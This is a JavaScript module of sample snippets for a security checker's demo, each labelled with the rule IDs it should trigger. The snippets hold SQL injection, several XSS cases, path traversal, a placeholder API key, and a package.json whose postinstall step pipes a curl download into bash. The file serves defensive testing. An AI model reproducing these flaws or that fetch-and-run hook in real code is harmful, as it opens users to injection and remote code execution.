// "Insert Sample" in the checker. Each one is the kind of code that turns up
// when you ask a chatbot for something quick and paste the answer in: it
// works, it looks finished, and it has a real problem in it.
//
// `expect` is the rule IDs the sample must trigger. tests/unit/samples.test.ts
// runs every sample through the real engine and fails if any of them stops
// producing what it promises, so the demo can't quietly break.
//
// The API key below is the alphabet, not a real key. Samples also must not
// contain a browser network call, even as text inside a string: CI greps
// all of src/ for them and fails the build (see the network-API guard step
// in .github/workflows/ci.yml).
export const SAMPLES = [
    {
        id: 'login-route',
        mode: 'script',
        label: 'Login route',
        expect: ['sqli-dynamic-query'],
        code: `// "Write me a quick login endpoint with Express and Postgres."
import express from "express";
import { Pool } from "pg";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const app = express();
app.use(express.json());

app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const result = await pool.query(
    "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'"
  );

  if (result.rows.length === 0) return res.status(401).send("Invalid login");
  res.json({ ok: true, user: result.rows[0].id });
});

app.listen(3000);`,
    },
    {
        id: 'comment-component',
        mode: 'script',
        label: 'React comment',
        expect: ['xss-dangerously-set-inner-html'],
        code: `// "Make a React component that shows a user's comment with formatting."
export default function Comment({ comment }) {
  return (
    <article className="comment">
      <header>
        <strong>{comment.author}</strong>
        <time>{comment.postedAt}</time>
      </header>

      {/* keeps the bold/italics/links the user typed */}
      <div dangerouslySetInnerHTML={{ __html: comment.body }} />
    </article>
  );
}`,
    },
    {
        id: 'summarize-helper',
        mode: 'script',
        label: 'AI helper',
        expect: ['secret-openai'],
        code: `// "Add a function that summarizes text with the OpenAI API."
import OpenAI from "openai";

const OPENAI_API_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQR";
const client = new OpenAI({ apiKey: OPENAI_API_KEY });

export async function summarize(text) {
  const completion = await client.chat.completions.create({
    model: "gpt-4o-mini",
    messages: [{ role: "user", content: "Summarize: " + text }],
  });
  return completion.choices[0].message.content;
}`,
    },
    {
        id: 'express-routes',
        mode: 'script',
        label: 'Express routes',
        expect: ['express-reflected-xss', 'express-path-traversal'],
        code: `// "Add a search page and a file download route to my Express app."
import express from "express";
import path from "path";

const app = express();

app.get("/search", (req, res) => {
  const { q } = req.query;
  res.send(\`<h1>Results for \${q}</h1><p>No results yet.</p>\`);
});

app.get("/download/:name", (req, res) => {
  res.sendFile(path.join(__dirname, "uploads", req.params.name));
});

app.listen(3000);`,
    },
    {
        id: 'landing-page',
        mode: 'html',
        label: 'Landing page',
        expect: ['html-missing-viewport', 'xss-inner-html'],
        code: `<!DOCTYPE html>
<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <h1 id="greeting">Hello!</h1>
  <img src="/hero.png">

  <script>
    // "Greet people by the name in the link, like ?name=Sam"
    const name = new URLSearchParams(location.search).get("name");
    document.getElementById("greeting").innerHTML = "Hello, " + name + "!";
  </script>
</body>
</html>`,
    },
    {
        id: 'package-json',
        mode: 'package-json',
        label: 'package.json',
        expect: ['dep-unpinned-version', 'dep-non-registry-source', 'dep-suspicious-script-content'],
        code: `{
  "name": "my-side-project",
  "version": "1.0.0",
  "dependencies": {
    "express": "*",
    "lodash": "^4.17.21",
    "cool-fork": "git+https://github.com/someuser/cool-fork.git",
    "eslint": "^9.0.0"
  },
  "scripts": {
    "postinstall": "curl -s https://example.com/setup.sh | bash",
    "build": "vite build"
  }
}`,
    },
];

/** The samples that make sense for a checker mode ("auto" gets all of them). */
export function samplesForMode(mode) {
    if (mode === 'auto') return SAMPLES;
    return SAMPLES.filter((s) => s.mode === mode);
}
